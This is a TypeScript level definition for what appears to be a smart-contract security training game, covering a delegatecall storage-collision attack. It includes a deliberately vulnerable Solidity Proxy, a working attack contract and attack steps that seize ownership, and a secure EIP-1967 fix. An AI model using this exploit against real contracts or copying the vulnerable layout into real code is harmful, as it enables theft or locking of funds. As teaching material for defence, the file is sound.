import type { Level } from '@/types';

const level: Level = {
  id: 3,
  title: 'Delegatecall Exploit',
  slug: 'delegatecall',
  difficulty: 'Medium',
  category: 'Storage Collision',
  description:
    'delegatecall is a low-level function that executes another contract\'s code in the context of the calling contract. This means the called code operates on the caller\'s storage, msg.sender, and msg.value. If the storage layouts of the two contracts do not match, the delegated code can inadvertently overwrite critical state variables like the contract owner.',
  objective:
    'Exploit the storage layout mismatch between the Proxy contract and the Logic library to overwrite the owner variable and take control of the Proxy.',
  vulnerableContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Library contract that the Proxy delegates to
contract Logic {
    // Storage slot 0
    uint256 public num;

    function setNum(uint256 _num) public {
        num = _num;
    }
}

// Proxy contract that delegates calls to Logic
contract Proxy {
    // Storage slot 0 - collides with Logic's "num"!
    address public owner;
    // Storage slot 1
    address public logicAddress;

    constructor(address _logicAddress) {
        owner = msg.sender;
        logicAddress = _logicAddress;
    }

    // Delegates any call to the Logic contract
    // Vulnerability: Logic.setNum() writes to slot 0,
    // which is "owner" in Proxy's storage layout
    function forward(bytes memory _data) public {
        (bool success, ) = logicAddress.delegatecall(_data);
        require(success, "Delegatecall failed");
    }

    function getOwner() public view returns (address) {
        return owner;
    }
}`,
  attackContract: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Proxy.sol";

contract DelegatecallAttack {
    address public proxy;

    constructor(address _proxyAddress) {
        proxy = _proxyAddress;
    }

    function attack() external {
        // Encode the call to setNum() with the attacker's address cast to uint256
        // When delegatecall executes setNum(), it writes to storage slot 0
        // In Proxy's layout, slot 0 is the "owner" variable
        bytes memory data = abi.encodeWithSignature(
            "setNum(uint256)",
            uint256(uint160(address(this)))
        );

        // Call forward() which will delegatecall to Logic.setNum()
        Proxy(proxy).forward(data);
    }

    function getOwner() external view returns (address) {
        return Proxy(proxy).getOwner();
    }
}`,
  hints: [
    'Compare the storage layouts of Proxy and Logic. Which variable is at storage slot 0 in each contract?',
    'delegatecall executes the target code but uses the caller\'s storage. If Logic.setNum() writes to slot 0, what variable does it overwrite in Proxy\'s storage?',
    'Encode a call to setNum() with your address cast as a uint256. Pass this to Proxy.forward(). The delegatecall will write your address into slot 0 of Proxy, overwriting the owner variable.',
  ],
  solution:
    'The Proxy contract stores "owner" at storage slot 0, while the Logic contract stores "num" at slot 0. When Proxy.forward() delegatecalls Logic.setNum(), the value written to slot 0 goes into Proxy\'s storage -- overwriting the owner. Encode setNum(uint256(uint160(attackerAddress))) and pass it to forward(). The owner is now the attacker.',
  explanation:
    'delegatecall preserves the caller\'s context (storage, msg.sender, msg.value) while executing another contract\'s bytecode. The critical issue is that storage slot assignments are positional, not name-based. Logic\'s "num" and Proxy\'s "owner" both occupy slot 0. When Logic.setNum() writes a value to slot 0 via delegatecall, it overwrites whatever is at slot 0 in the calling contract -- which is the owner address. By passing an address (cast to uint256) as the argument to setNum(), the attacker can set themselves as the owner of the Proxy contract. This is why proxy patterns must ensure identical storage layouts between the proxy and implementation.',
  secureCoding: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Fix: Ensure matching storage layouts between proxy and implementation
contract LogicV2 {
    // Storage layout must EXACTLY match the Proxy
    address public owner;       // slot 0 - matches Proxy
    address public logicAddress; // slot 1 - matches Proxy
    uint256 public num;         // slot 2 - new variables go after

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function setNum(uint256 _num) public {
        num = _num;
    }
}

// Better approach: Use EIP-1967 storage slots
contract ProxySecure {
    // EIP-1967 storage slot for implementation address
    // bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    // EIP-1967 storage slot for admin
    // bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1)
    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    constructor(address _logic) {
        _setAdmin(msg.sender);
        _setImplementation(_logic);
    }

    function _setImplementation(address _impl) private {
        assembly {
            sstore(IMPLEMENTATION_SLOT, _impl)
        }
    }

    function _setAdmin(address _admin) private {
        assembly {
            sstore(ADMIN_SLOT, _admin)
        }
    }

    fallback() external payable {
        address impl;
        assembly {
            impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}`,
  realWorldImpact:
    'Parity Multisig Wallet Hack (2017) - The second Parity hack exploited delegatecall in the wallet library. An attacker called an unprotected initWallet() function through delegatecall, becoming the owner of the library contract itself. They then called kill() to selfdestruct the library, bricking all 587 wallets that depended on it and permanently locking approximately $150 million in ETH. This incident led to the development of safer proxy patterns like EIP-1967 and the Transparent Proxy pattern.',
  moduleMapping: 'Module 3.1 Web Application Vulnerabilities',
  attackSteps: [
    {
      title: 'Analyze Storage Layouts',
      description:
        'The attacker compares the storage layout of both contracts. Proxy has "owner" at slot 0, while Logic has "num" at slot 0. This mismatch is the vulnerability.',
      stateChange: 'Reconnaissance: storage collision identified at slot 0',
    },
    {
      title: 'Craft Malicious Calldata',
      description:
        'The attacker encodes a call to setNum() with their address converted to uint256. This will write the attacker\'s address to storage slot 0 when executed via delegatecall.',
      code: 'bytes memory payload = abi.encodeWithSignature("setNum(uint256)", uint256(uint160(attackerAddr)));',
      stateChange: 'Malicious payload constructed',
    },
    {
      title: 'Execute via forward()',
      description:
        'The attacker calls Proxy.forward() with the crafted payload. The proxy delegatecalls Logic.setNum(), which writes the attacker\'s address to slot 0 in the proxy\'s storage.',
      code: 'proxy.forward(payload);',
      stateChange: 'Proxy.owner (slot 0): deployer -> attacker',
    },
    {
      title: 'Ownership Confirmed',
      description:
        'The attacker calls getOwner() to verify they now control the proxy. Any owner-restricted functions are now accessible to the attacker.',
      code: 'proxy.getOwner(); // returns attacker address',
      stateChange: 'Attacker has full control of the Proxy contract',
    },
  ],
};

export default level;
